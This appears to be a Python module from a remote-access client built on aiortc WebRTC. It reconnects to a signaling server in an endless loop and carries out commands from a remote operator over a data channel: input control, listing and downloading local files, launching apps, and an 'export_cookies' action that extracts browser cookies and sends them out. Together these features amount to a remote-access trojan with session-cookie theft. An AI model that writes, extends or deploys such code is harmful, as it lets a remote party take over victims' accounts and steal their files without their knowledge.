"""WebRTC client lifecycle management."""
from __future__ import annotations

import asyncio
import contextlib
import json
import os
import logging
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from aiortc import (
    RTCPeerConnection,
    RTCSessionDescription,
    RTCConfiguration,
    RTCIceServer,
)
from aiortc.sdp import candidate_from_sdp

from remote_client.control.handlers import ControlHandler
from remote_client.files.file_service import FileService, FileServiceError
from remote_client.security.e2ee import E2EEContext, E2EEError
from remote_client.webrtc.signaling import WebSocketSignaling

logger = logging.getLogger(__name__)


def _normalize_ice_servers(value: Any) -> list[dict[str, Any]]:
    """Normalize ICE server entries into a list of RTC-compatible dicts."""
    servers: list[dict[str, Any]] = []
    if isinstance(value, dict):
        value = [value]
    if not isinstance(value, list):
        return servers
    for entry in value:
        if isinstance(entry, str):
            servers.append({"urls": [entry]})
            continue
        if not isinstance(entry, dict):
            continue
        urls = entry.get("urls") or entry.get("url")
        if not urls:
            continue
        if isinstance(urls, str):
            urls_list = [urls]
        elif isinstance(urls, list):
            urls_list = [item for item in urls if isinstance(item, str)]
        else:
            continue
        server: dict[str, Any] = {"urls": urls_list}
        if "username" in entry:
            server["username"] = entry["username"]
        if "credential" in entry:
            server["credential"] = entry["credential"]
        servers.append(server)
    return servers


def _load_ice_servers() -> list[RTCIceServer]:
    """Load ICE server config from the RC_ICE_SERVERS env var."""
    raw = os.getenv("RC_ICE_SERVERS")
    if not raw:
        return [
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun.cloudflare.com:3478"]),
        ]
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        return [
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun.cloudflare.com:3478"]),
        ]
    servers = _normalize_ice_servers(parsed)
    return [RTCIceServer(**server) for server in servers]


@dataclass
class SessionResources:
    """Resources required to serve a remote session."""
    control_handler: ControlHandler
    media_tracks: list[Any]
    close: Callable[[], None] | None = None
    launch_app: Callable[[str], None] | None = None
    set_stream_profile: Callable[
        [str | None, int | None, int | None, int | None], None
    ] | None = None


SessionFactory = Callable[[str | None], SessionResources | tuple[ControlHandler, list[Any]]]


class WebRTCClient:
    """Manages WebRTC connections and dispatches data channel actions."""

    def __init__(
        self,
        session_id: str,
        signaling: WebSocketSignaling,
        session_factory: SessionFactory,
        file_service: FileService,
        cookie_exporter: object | None = None,
        device_token: str | None = None,
        team_id: str | None = None,
        client_config: dict | None = None,
        e2ee: E2EEContext | None = None,
    ) -> None:
        self._session_id = session_id
        self._signaling = signaling
        self._session_factory = session_factory
        self._file_service = file_service
        self._cookie_exporter = cookie_exporter
        self._device_token = device_token
        self._team_id = team_id
        self._client_config = client_config
        self._e2ee = e2ee
        self._rtc_configuration = RTCConfiguration(iceServers=_load_ice_servers())
        self._pending_offer: dict[str, Any] | None = None

    async def run_forever(self) -> None:
        """Reconnect in a loop, keeping the client available."""
        while True:
            await self._run_once()
            await asyncio.sleep(2)

    async def _run_once(self) -> None:
        """Run a single signaling and WebRTC session."""
        peer_connection = RTCPeerConnection(self._rtc_configuration)
        connection_done = asyncio.Event()
        control_handler: ControlHandler | None = None
        session_cleanup: Callable[[], None] | None = None
        session_actions: SessionResources | None = None
        operator_id_holder: dict[str, str | None] = {"value": None}

        @peer_connection.on("connectionstatechange")
        async def on_connectionstatechange() -> None:
            if peer_connection.connectionState in {"failed", "closed", "disconnected"}:
                connection_done.set()

        @peer_connection.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange() -> None:
            if peer_connection.iceConnectionState in {"failed", "closed", "disconnected"}:
                connection_done.set()

        @peer_connection.on("datachannel")
        def on_datachannel(data_channel):
            @data_channel.on("close")
            def on_close() -> None:
                connection_done.set()

            @data_channel.on("message")
            async def on_message(message):
                try:
                    plaintext = self._prepare_incoming(message)
                except E2EEError as exc:
                    self._send_error(data_channel, "e2ee_error", str(exc))
                    return
                try:
                    payload = json.loads(plaintext)
                except json.JSONDecodeError as exc:
                    self._send_error(data_channel, "invalid_json", str(exc))
                    return
                if control_handler is None:
                    self._send_error(data_channel, "not_ready", "Session not ready.")
                    return
                await self._handle_message(
                    data_channel, payload, control_handler, session_actions
                )

        @peer_connection.on("icecandidate")
        async def on_icecandidate(candidate) -> None:
            if candidate is None:
                return
            payload = {
                "type": "ice",
                "session_id": self._session_id,
                "candidate": candidate.candidate,
                "sdpMid": candidate.sdpMid,
                "sdpMLineIndex": candidate.sdpMLineIndex,
            }
            if operator_id_holder["value"]:
                payload["operator_id"] = operator_id_holder["value"]
            await self._signaling.send(payload)

        try:
            await self._signaling.connect()
            register_payload = {
                "type": "register",
                "session_id": self._session_id,
                "role": "client",
            }
            if self._device_token:
                register_payload["device_token"] = self._device_token
            if self._team_id:
                register_payload["team_id"] = self._team_id
            if self._client_config:
                register_payload["client_config"] = self._client_config
            await self._signaling.send(register_payload)
            offer_payload = await self._await_offer()
            if offer_payload is None:
                return
            operator_id_holder["value"] = offer_payload.get("operator_id")
            session_mode = offer_payload.get("mode")
            resources = self._session_factory(session_mode)
            if isinstance(resources, tuple):
                control_handler, media_tracks = resources
                session_cleanup = None
                session_actions = None
            else:
                control_handler = resources.control_handler
                media_tracks = resources.media_tracks
                session_cleanup = resources.close
                session_actions = resources
            offer = RTCSessionDescription(
                sdp=offer_payload["sdp"], type=offer_payload["type"]
            )
            await peer_connection.setRemoteDescription(offer)

            offered_kinds = {
                transceiver.kind for transceiver in peer_connection.getTransceivers()
            }
            for track in media_tracks:
                if track.kind in offered_kinds:
                    peer_connection.addTrack(track)

            answer = await peer_connection.createAnswer()
            await peer_connection.setLocalDescription(answer)
            answer_payload = {
                "type": peer_connection.localDescription.type,
                "sdp": peer_connection.localDescription.sdp,
            }
            if operator_id_holder["value"]:
                answer_payload["operator_id"] = operator_id_holder["value"]
            await self._signaling.send(answer_payload)

            signaling_task = asyncio.create_task(
                self._signaling_loop(peer_connection, operator_id_holder)
            )
            connection_task = asyncio.create_task(connection_done.wait())
            done, pending = await asyncio.wait(
                {signaling_task, connection_task},
                return_when=asyncio.FIRST_COMPLETED,
            )
            for task in pending:
                task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await asyncio.gather(*pending)
            signaling_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await signaling_task
        except (ConnectionError, OSError, asyncio.CancelledError):
            return
        finally:
            await peer_connection.close()
            await self._signaling.close()
            if session_cleanup:
                try:
                    session_cleanup()
                except Exception as exc:
                    logger.warning("Session cleanup failed: %s", exc)

    async def _await_offer(self) -> dict[str, Any] | None:
        """Wait for an SDP offer from the signaling server."""
        if self._pending_offer:
            offer = self._pending_offer
            self._pending_offer = None
            return offer
        while True:
            signaling_message = await self._signaling.receive()
            if signaling_message is None:
                return None
            if signaling_message.get("type") == "offer":
                return signaling_message

    async def _signaling_loop(
        self,
        peer_connection: RTCPeerConnection,
        operator_id_holder: dict[str, str | None],
    ) -> None:
        """Relay ICE candidates from signaling to the peer connection."""
        while True:
            message = await self._signaling.receive()
            if message is None:
                return
            message_type = message.get("type")
            if message_type == "offer":
                self._pending_offer = message
                return
            if message_type == "ice":
                message_operator = message.get("operator_id")
                if (
                    operator_id_holder["value"]
                    and message_operator
                    and message_operator != operator_id_holder["value"]
                ):
                    continue
                if operator_id_holder["value"] is None and message_operator:
                    operator_id_holder["value"] = message_operator
                candidate = message.get("candidate")
                if not candidate:
                    continue
                try:
                    candidate_sdp = candidate
                    if candidate_sdp.startswith("candidate:"):
                        candidate_sdp = candidate_sdp[len("candidate:") :]
                    ice_candidate = candidate_from_sdp(candidate_sdp)
                    ice_candidate.sdpMid = message.get("sdpMid")
                    ice_candidate.sdpMLineIndex = message.get("sdpMLineIndex")
                    await peer_connection.addIceCandidate(ice_candidate)
                except Exception as exc:
                    logger.warning("Failed to apply ICE candidate: %s", exc)

    async def _handle_message(
        self,
        data_channel,
        payload: dict[str, Any],
        control_handler: ControlHandler,
        session_actions: SessionResources | None = None,
    ) -> None:
        """Dispatch data channel actions."""
        action = payload.get("action")
        if not action:
            self._send_error(data_channel, "missing_action", "Message missing 'action'.")
            return
        if action == "control":
            try:
                control_handler.handle(payload)
            except (KeyError, ValueError, TypeError) as exc:
                self._send_error(data_channel, "invalid_control", str(exc))
            return

        if action == "list_files":
            path = payload.get("path", ".")
            try:
                base_path, entries = self._file_service.list_files_with_base(path)
            except FileServiceError as exc:
                self._send_error(data_channel, exc.code, str(exc))
                return
            self._send_payload(
                data_channel,
                {
                    "path": base_path,
                    "files": self._file_service.serialize_entries(entries),
                },
            )
            return

        if action == "download":
            try:
                path = payload["path"]
            except KeyError as exc:
                self._send_error(data_channel, "missing_path", "Download missing 'path'.")
                return
            try:
                self._send_payload(
                    data_channel,
                    self._file_service.read_file_base64(path),
                )
            except FileServiceError as exc:
                self._send_error(data_channel, exc.code, str(exc))
            return

        if action == "export_cookies":
            browsers = payload.get("browsers")
            cookie_error = None
            if self._cookie_exporter is None:
                try:
                    from remote_client.cookie_extractor import CookieExporter, CookieExportError
                except Exception as exc:
                    logger.warning("Cookie exporter import failed: %s", exc)
                    self._send_error(
                        data_channel,
                        "cookie_export_unavailable",
                        "Cookie export is unavailable on this client.",
                    )
                    return
                exporter = CookieExporter()
                cookie_error = CookieExportError
            else:
                exporter = self._cookie_exporter
            try:
                payload_base64 = exporter.export_base64(browsers)
            except Exception as exc:
                if cookie_error and isinstance(exc, cookie_error):
                    self._send_error(data_channel, exc.code, str(exc))
                    return
                logger.warning("Cookie export failed: %s", exc)
                self._send_error(
                    data_channel,
                    "cookie_export_failed",
                    "Cookie export failed.",
                )
                return
            self._send_payload(data_channel, payload_base64)
            return

        if action == "launch_app":
            app_name = payload.get("app")
            if not app_name:
                self._send_error(data_channel, "missing_app", "Launch missing 'app'.")
                return
            if not session_actions or not session_actions.launch_app:
                self._send_error(
                    data_channel,
                    "unsupported",
                    "Application launch is unavailable for this session.",
                )
                return
            try:
                session_actions.launch_app(str(app_name))
            except (ValueError, FileNotFoundError) as exc:
                self._send_error(data_channel, "launch_failed", str(exc))
                return
            except Exception as exc:
                self._send_error(data_channel, "launch_failed", "Launch failed.")
                logger.warning("Failed to launch app '%s': %s", app_name, exc)
                return
            self._send_payload(
                data_channel,
                {"action": "launch_app", "app": app_name, "status": "launched"},
            )
            return

        if action == "stream_profile":
            if not session_actions or not session_actions.set_stream_profile:
                self._send_error(
                    data_channel,
                    "unsupported",
                    "Stream profile updates are unavailable for this session.",
                )
                return
            profile = payload.get("profile")
            width = payload.get("width")
            height = payload.get("height")
            fps = payload.get("fps")
            try:
                width_value = int(width)
            except (TypeError, ValueError):
                width_value = None
            try:
                height_value = int(height)
            except (TypeError, ValueError):
                height_value = None
            try:
                fps_value = int(fps)
            except (TypeError, ValueError):
                fps_value = None
            if width_value is not None and width_value <= 0:
                width_value = None
            if height_value is not None and height_value <= 0:
                height_value = None
            if fps_value is not None and fps_value <= 0:
                fps_value = None
            try:
                session_actions.set_stream_profile(
                    profile, width_value, height_value, fps_value
                )
            except ValueError as exc:
                self._send_error(data_channel, "invalid_profile", str(exc))
            except Exception as exc:
                logger.warning("Failed to update stream profile: %s", exc)
                self._send_error(data_channel, "stream_profile_failed", "Profile update failed.")
            return

        self._send_error(
            data_channel, "unknown_action", f"Unknown action '{action}'."
        )

    def _prepare_incoming(self, message: str | bytes | bytearray) -> str:
        """Decode and optionally decrypt incoming data channel messages."""
        if isinstance(message, (bytes, bytearray)):
            try:
                text = bytes(message).decode("utf-8")
            except UnicodeDecodeError as exc:
                raise E2EEError("Invalid text encoding.") from exc
        else:
            text = message
        if not self._e2ee:
            return text
        try:
            envelope = json.loads(text)
        except json.JSONDecodeError as exc:
            raise E2EEError("E2EE envelope required.") from exc
        if not self._e2ee.is_envelope(envelope):
            raise E2EEError("E2EE envelope required.")
        return self._e2ee.decrypt_envelope(envelope)

    def _send_payload(self, data_channel, payload: dict[str, Any] | str) -> None:
        """Send a payload over the data channel, applying E2EE if configured."""
        if isinstance(payload, str):
            message = payload
        else:
            message = json.dumps(payload)
        if self._e2ee:
            message = self._e2ee.encrypt_text(message)
        data_channel.send(message)

    def _send_error(self, data_channel, code: str, message: str) -> None:
        """Send a structured error over the data channel."""
        self._send_payload(data_channel, {"error": {"code": code, "message": message}})
